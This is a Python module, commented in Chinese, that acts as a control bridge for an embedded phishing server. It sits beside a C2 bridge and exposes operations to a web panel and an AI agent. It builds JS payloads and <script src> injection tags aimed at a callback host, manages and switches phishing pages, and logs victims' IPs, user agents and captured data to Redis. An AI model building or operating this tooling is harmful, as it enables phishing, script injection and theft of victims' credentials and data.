"""钓鱼页面桥接 — 内嵌 phishing_server,向 web 面板与 Agent 暴露操作接口。

与 flowscan/c2_bridge.py 同构:
- 懒加载单例(init_phishing 首次调用时才 import + 启动,失败不崩溃调用方)
- headless 后台线程跑 server.start()
- 单锁 _PHISHING_LOCK 串行所有操作;嵌套调用拆无锁内部函数
  (⚠️ threading.Lock 不可重入:持锁调另一加锁函数会永久阻塞,参照 c2_bridge
  的 _task_list_unlocked 教训 —— 新增"持锁内再调 bridge 函数"前先检查)
"""

import importlib
import json
import os
import sys
import threading
import time

_PHISHING = None            # PhishingServer 单例
_PHISHING_LOCK = threading.Lock()
_PHISHING_INIT_ERROR = ""   # 初始化失败信息
_PHISHING_ROOT = ""         # 最近一次 init_phishing 的参数(restart 用)
_PHISHING_CONFIG_FILE = "config.json"
_FLOWSCAN_CONFIG_PATH = ""  # FlowScan config.yaml 路径(init_from_flowscan_config 用)

# 回传数据 Redis 键
_REPORT_KEY = "fs3:phishing:reports"
_REPORT_ITEM_KEY = "fs3:phishing:report:{}"
_REPORT_MAX = 500


def init_phishing(project_root: str, config_file: str = "config.json"):
    """懒加载初始化 phishing server。已初始化直接返回;失败记录错误并返回 None。"""
    global _PHISHING, _PHISHING_INIT_ERROR, _PHISHING_ROOT, _PHISHING_CONFIG_FILE
    if _PHISHING is not None:
        return _PHISHING
    with _PHISHING_LOCK:
        if _PHISHING is not None:
            return _PHISHING
        _PHISHING_ROOT = os.path.abspath(project_root)
        _PHISHING_CONFIG_FILE = config_file
        root = _PHISHING_ROOT
        if not os.path.isdir(root):
            _PHISHING_INIT_ERROR = f"phishing 项目根不存在: {root}"
            return None
        parent = os.path.dirname(root)
        if parent not in sys.path:
            sys.path.insert(0, parent)
        try:
            pkg_name = os.path.basename(root)
            sys.modules.setdefault("phishing_server", importlib.import_module(pkg_name))
            from phishing_server.config import load_config
            from phishing_server.server import PhishingServer
        except Exception as exc:
            _PHISHING_INIT_ERROR = f"phishing import 失败: {exc}"
            return None
        config_path = os.path.join(root, config_file)
        try:
            config = load_config(config_path)
            # 端口合并:config.yaml 的 phishing.port 优先覆盖(改外层配置免重建镜像)
            port_override = _port_override_from_flowscan_config()
            if port_override:
                config.port = port_override
            problems = config.validate()
            if problems:
                _PHISHING_INIT_ERROR = "config 校验失败: " + "; ".join(problems)
                return None
            # host_override:config.yaml 的 phishing.host 字段可指定对外反连地址
            host_override = _host_override_from_flowscan_config()
            server = PhishingServer(config, report_callback=None,
                                    host_override=host_override)
        except Exception as exc:
            _PHISHING_INIT_ERROR = f"phishing server 初始化失败: {exc}"
            return None
        # 后台线程跑 start()(阻塞在 serve_forever)
        t = threading.Thread(target=server.start, daemon=True, name="phishing-server")
        t.start()
        # 等绑定完成(端口 0 动态绑定时拿到实际端口)
        deadline = time.time() + 5
        while not server._httpd and time.time() < deadline:
            time.sleep(0.02)
        if server._httpd is None:
            _PHISHING_INIT_ERROR = server._start_error or "phishing server 启动失败"
            return None
        _PHISHING = server
        return server


def get_phishing():
    return _PHISHING


def init_error() -> str:
    return _PHISHING_INIT_ERROR


def set_flowscan_config(config_path: str) -> None:
    """记录 FlowScan config.yaml 路径。"""
    global _FLOWSCAN_CONFIG_PATH
    _FLOWSCAN_CONFIG_PATH = config_path


def _port_override_from_flowscan_config():
    """从 FlowScan config.yaml 的 phishing.port 读反连端口(可选,优先覆盖 config.json)。"""
    if not _FLOWSCAN_CONFIG_PATH:
        return None
    try:
        with open(_FLOWSCAN_CONFIG_PATH, encoding="utf-8") as f:
            import yaml
            v = (yaml.safe_load(f).get("phishing", {}) or {}).get("port")
        return int(v) if v else None
    except Exception:
        return None


def _host_override_from_flowscan_config() -> str:
    """从 FlowScan config.yaml 的 phishing.host 读对外反连地址(可选)。"""
    if not _FLOWSCAN_CONFIG_PATH:
        return ""
    try:
        import yaml
        with open(_FLOWSCAN_CONFIG_PATH, encoding="utf-8") as f:
            cfg = yaml.safe_load(f).get("phishing", {}) or {}
        return str(cfg.get("host", "") or "").strip()
    except Exception:
        return ""


def init_from_flowscan_config():
    """用 FlowScan config.yaml 的 phishing 段懒加载。未启用返回 None。"""
    if not _FLOWSCAN_CONFIG_PATH:
        return None
    import yaml
    try:
        with open(_FLOWSCAN_CONFIG_PATH, encoding="utf-8") as f:
            cfg = yaml.safe_load(f).get("phishing", {}) or {}
    except Exception:
        return None
    if not cfg.get("enabled", False):
        return None
    return init_phishing(str(cfg.get("project_root", "phishing_server")),
                         str(cfg.get("config_file", "config.json")))


# ── 状态 / 模块 ──

def status() -> dict:
    server = get_phishing()
    if not server:
        return {"ok": False, "running": False, "error": _PHISHING_INIT_ERROR or "未初始化"}
    with _PHISHING_LOCK:
        return server.status()


def list_modules() -> list:
    server = get_phishing()
    if not server:
        return []
    with _PHISHING_LOCK:
        return server.modules


def get_module(name: str):
    server = get_phishing()
    if not server:
        return None
    with _PHISHING_LOCK:
        return server._builder._loader.get_module(name)


def build_payload(name: str, args: dict, host: str = "") -> dict:
    """dry-run 构建 JS payload(不落盘)。返回 {ok, code|error}。"""
    server = get_phishing()
    if not server:
        return {"ok": False, "error": _PHISHING_INIT_ERROR or "phishing 未启动"}
    with _PHISHING_LOCK:
        return server._builder.build(name, args or {}, host=host or server._host_override)


def build_script_tag(name: str, args: dict, host: str = "") -> dict:
    """生成 <script src> 注入标签。"""
    server = get_phishing()
    if not server:
        return {"ok": False, "error": _PHISHING_INIT_ERROR or "phishing 未启动"}
    with _PHISHING_LOCK:
        return server._builder.build_script_tag(name, args or {},
                                                host=host or server._host_override)


# ── 页面模块 ──

def list_pages() -> list:
    server = get_phishing()
    if not server:
        return []
    with _PHISHING_LOCK:
        return server._pages.list_pages()


def get_page(name: str):
    server = get_phishing()
    if not server:
        return None
    with _PHISHING_LOCK:
        if not server._pages.page_exists(name):
            return None
        return {"name": name, "desc": server._pages._read_desc(
            os.path.join(server._pages._pages_dir, name), name),
            "files": server._pages.list_page_files(name)}


def set_active_page(name: str):
    """设为当前活动页面(写 config.json + 内存生效,免重启)。"""
    server = get_phishing()
    if not server:
        return False, _PHISHING_INIT_ERROR or "phishing 未启动"
    with _PHISHING_LOCK:
        if not server._pages.page_exists(name):
            return False, f"页面 {name} 不存在"
        from phishing_server.config import save_config
        ok, _ = save_config(server._config.config_path, server._config,
                            {"active_page": name})
        if not ok:
            return False, "写回 config.json 失败"
        server._config.active_page = name
        return True, f"当前页面已切换为 {name}(即时生效)"


def list_page_files(name: str) -> list:
    server = get_phishing()
    if not server:
        return []
    with _PHISHING_LOCK:
        return server._pages.list_page_files(name)


def read_page_file(name: str, file: str):
    server = get_phishing()
    if not server:
        return None
    with _PHISHING_LOCK:
        return server._pages.read_page_file(name, file)


def write_page_file(name: str, file: str, content: str):
    server = get_phishing()
    if not server:
        return False, "phishing 未启动"
    with _PHISHING_LOCK:
        return server._pages.write_page_file(name, file, content)


def create_page(name: str, desc: str = ""):
    server = get_phishing()
    if not server:
        return False, "phishing 未启动"
    with _PHISHING_LOCK:
        return server._pages.create_page(name, desc)


def delete_page(name: str):
    server = get_phishing()
    if not server:
        return False, "phishing 未启动"
    with _PHISHING_LOCK:
        if name == server._pages.active_page(server._config):
            return False, "不能删除当前活动页面,请先切换"
        return server._pages.delete_page(name)


# ── 生命周期 / 配置 ──

def start():
    """启动(首次 init 已自动启动;此处用于手动重启后拉起)。"""
    server = get_phishing()
    if not server:
        return False, _PHISHING_INIT_ERROR or "phishing 未初始化"
    with _PHISHING_LOCK:
        if server.running:
            return True, "已在运行"
        t = threading.Thread(target=server.start, daemon=True, name="phishing-server")
        t.start()
        deadline = time.time() + 5
        while not server._httpd and time.time() < deadline:
            time.sleep(0.02)
        if server._httpd is None:
            return False, server._start_error or "启动失败"
        return True, f"已启动(端口 {server.port})"


def stop():
    server = get_phishing()
    if not server:
        return True, "未初始化"
    with _PHISHING_LOCK:
        if not server.running and server._httpd is None:
            return True, "已停止"
        server.stop()
        return True, "已停止"


def restart():
    """重启:stop → 重新 init(beacon/页面访问短暂中断,配置热读)。"""
    global _PHISHING
    with _PHISHING_LOCK:
        old = _PHISHING
        if old is not None:
            try:
                old.stop()
            except Exception as exc:
                return False, f"stop 失败: {exc}"
            _PHISHING = None
    if not _PHISHING_ROOT:
        return False, "未初始化过,无法重启"
    srv = init_phishing(_PHISHING_ROOT, _PHISHING_CONFIG_FILE)
    if not srv:
        return False, f"重启失败: {_PHISHING_INIT_ERROR}"
    return True, f"已重启(端口 {srv.port})"


def update_config(updates: dict):
    """更新 config.json 白名单字段;端口/路由变更需重启生效。"""
    server = get_phishing()
    if not server:
        return False, _PHISHING_INIT_ERROR or "phishing 未启动"
    with _PHISHING_LOCK:
        from phishing_server.config import save_config
        ok, changed = save_config(server._config.config_path, server._config, updates)
        if not ok:
            return False, "写回 config.json 失败"
        # active_page/default_module 内存即时生效;端口/路由需重启
        cfg = server._config
        if "active_page" in changed:
            cfg.active_page = updates.get("active_page")
        if "default_module" in changed:
            cfg.default_module = str(updates.get("default_module") or "")
        if "host" in changed:
            cfg.host = str(updates.get("host") or "")
        need_restart = any(k in changed for k in
                           ("port", "route_payload", "route_report", "report_max", "max_payload_bytes"))
        msg = f"已写入 config.json: {', '.join(changed)}"
        if need_restart:
            msg += "(端口/路由变更需重启生效)"
        else:
            msg += "(即时生效)"
        return True, msg


# ── 回传数据 ──

def _report_callback(redis, payload: dict, ip: str, ua: str) -> None:
    """server 回传落库(由 web 层在 init 后注入)。payload 为 dict。"""
    try:
        if not isinstance(payload, dict):
            payload = {}
        rid = f"{int(time.time() * 1000)}-{abs(hash(str(payload))) % 10000}"
        import uuid
        rid = uuid.uuid4().hex[:12]
        now = time.time()
        entry = {
            "id": rid,
            "ts": now,
            "ts_iso": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(now)),
            "ip": ip or "",
            "ua": (ua or "")[:200],
            "type": str(payload.get("type") or payload.get("module") or "report"),
            "url": str(payload.get("url") or "")[:300],
            "data": json.dumps(payload, ensure_ascii=False)[:4000],
        }
        pipe = redis.conn.pipeline()
        pipe.hset(_REPORT_ITEM_KEY.format(rid),
                  mapping={k: json.dumps(v, ensure_ascii=False) if not isinstance(v, str) else v
                           for k, v in entry.items()})
        pipe.zadd(_REPORT_KEY, {rid: now})
        pipe.zremrangebyrank(_REPORT_KEY, 0, -_REPORT_MAX - 1)
        pipe.execute()
        redis.log(f"[PHISHING] report {rid} type={entry['type']} ip={ip}")
    except Exception:
        pass  # 回传落库失败不影响执行


def attach_report_callback(redis) -> None:
    """把 Redis 落库回调挂到 server 上(init 后调用一次)。"""
    server = get_phishing()
    if server is None:
        return
    with _PHISHING_LOCK:
        server._redis = redis  # 供 list_reports/clear_reports 读回传数据
        server._report_callback = lambda p, ip, ua: _report_callback(redis, p, ip, ua)


def list_reports(limit: int = 100) -> list:
    server = get_phishing()
    if not server:
        return []
    with _PHISHING_LOCK:
        return _list_reports_unlocked(server, limit)


def _list_reports_unlocked(server, limit: int = 100) -> list:
    """回传列表的无锁内部实现(调用方须已持有 _PHISHING_LOCK)。

    Redis 键由 web 层在 attach_report_callback 时注入,这里通过
    server._redis 访问(未注入则返回空)。
    """
    redis = getattr(server, "_redis", None)
    if redis is None:
        return []
    try:
        ids = redis.conn.zrevrange(_REPORT_KEY, 0, max(0, int(limit) - 1))
        out = []
        for rid in ids:
            raw = redis.conn.hgetall(_REPORT_ITEM_KEY.format(rid))
            if raw:
                item = {}
                for k, v in raw.items():
                    try:
                        item[k] = json.loads(v) if not isinstance(v, str) else v
                    except Exception:
                        item[k] = v
                out.append(item)
        return out
    except Exception:
        return []


def clear_reports():
    server = get_phishing()
    if not server:
        return False, "phishing 未启动"
    with _PHISHING_LOCK:
        redis = getattr(server, "_redis", None)
        if redis is None:
            return False, "回传存储未挂载"
        try:
            ids = redis.conn.zrange(_REPORT_KEY, 0, -1)
            pipe = redis.conn.pipeline()
            for rid in ids:
                pipe.delete(_REPORT_ITEM_KEY.format(rid))
            pipe.delete(_REPORT_KEY)
            pipe.execute()
            return True, f"已清空 {len(ids)} 条回传记录"
        except Exception as exc:
            return False, str(exc)
